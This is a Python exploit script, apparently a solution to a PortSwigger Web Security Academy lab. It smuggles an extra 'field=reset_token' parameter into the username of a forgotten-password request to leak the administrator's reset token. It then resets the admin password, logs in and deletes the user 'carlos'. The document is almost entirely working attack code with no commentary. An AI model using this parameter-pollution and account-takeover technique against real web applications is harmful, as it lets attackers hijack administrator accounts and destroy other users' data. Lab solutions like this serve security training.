import re
import sys
import requests

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <url>")
        sys.exit(1)

burp_url = sys.argv[1]
login_url = burp_url + '/login'
reset_url = burp_url + '/forgot-password'
delete_url = burp_url + '/admin/delete?username=carlos'

session = requests.Session()
response = session.get(reset_url)
csrf_token_match = re.search(r'<input required type="hidden" name="csrf" value="([^"]+)"', response.text)
csrf = csrf_token_match.group(1)

burp_data = {"csrf": csrf, "username": "administrator%26field=reset_token"}
response = session.post(reset_url, data=burp_data)
match = re.search(r'[0-9a-zA-Z]{32}', response.text)
token = match.group(0)

burp_data = {"csrf": csrf, "reset_token": token, "new-password-1": "111111", "new-password-2": "111111"}
session.post(reset_url+'?reset_token='+token, data=burp_data)

response = session.get(login_url)
csrf_token_match = re.search(r'<input required type="hidden" name="csrf" value="([^"]+)"', response.text)
csrf = csrf_token_match.group(1)

burp_data = {"csrf": csrf, "username": "administrator", "password": "111111"}
session.post(login_url, data=burp_data)

session.get(delete_url)
